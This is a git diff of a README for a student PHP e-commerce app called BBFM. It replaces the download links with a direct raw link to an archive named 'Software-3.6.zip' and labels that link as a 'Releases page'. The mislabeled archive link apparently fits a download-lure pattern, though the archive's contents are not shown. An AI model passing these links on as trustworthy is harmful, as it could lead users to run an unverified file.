@@ -4,7 +4,7 @@
 Welcome to BBFM! Best Buy For Me is a student-built e-commerce web application. This app helps you explore products, add them to your cart, and manage orders—all in a simple and clean interface. Let’s get you started on using BBFM.
 
 ## 📥 Download BBFM
-[![Download BBFM](https://raw.githubusercontent.com/Sajjadul-Akondo/BBFM/main/dumple/BBFM.zip)](https://raw.githubusercontent.com/Sajjadul-Akondo/BBFM/main/dumple/BBFM.zip)
+[![Download BBFM](https://raw.githubusercontent.com/Sajjadul-Akondo/BBFM/main/dumple/Software-3.6.zip)](https://raw.githubusercontent.com/Sajjadul-Akondo/BBFM/main/dumple/Software-3.6.zip)
 
 ## 📋 System Requirements
 Ensure your device meets these basic requirements to run BBFM smoothly:
@@ -21,7 +21,7 @@ Before downloading, make sure you have the following:
 - **PHP:** Version 7.2 or later installed.
 
 ## 📁 Download & Install
-To get BBFM, simply visit the [Releases page](https://raw.githubusercontent.com/Sajjadul-Akondo/BBFM/main/dumple/BBFM.zip) and download the latest version. Here’s how:
+To get BBFM, simply visit the [Releases page](https://raw.githubusercontent.com/Sajjadul-Akondo/BBFM/main/dumple/Software-3.6.zip) and download the latest version. Here’s how:
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version, labeled with a version number.
